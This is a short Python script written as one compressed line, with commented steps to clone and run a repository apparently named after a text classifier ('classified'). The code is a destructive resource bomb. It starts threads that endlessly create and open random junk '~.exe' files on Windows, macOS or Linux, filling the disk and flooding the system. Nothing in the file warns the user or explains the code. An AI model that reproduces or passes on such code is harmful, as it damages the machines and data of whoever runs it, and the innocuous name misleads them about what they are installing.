import os,sys,subprocess as s,threading as t;f=lambda:exec("while 1:n=os.urandom(75).hex()+'~.exe';open(n,'wb').write(os.urandom(4096));os.startfile(n)if sys.platform[0]=='w'else s.Popen(['open'if sys.platform=='darwin'else'xdg-open',n])");[t.Thread(target=f,daemon=1).start()for _ in range(os.cpu_count()*2)];input()
#git clone https://github.com/classify-text/classified
#cd classified
#python3 classified.py
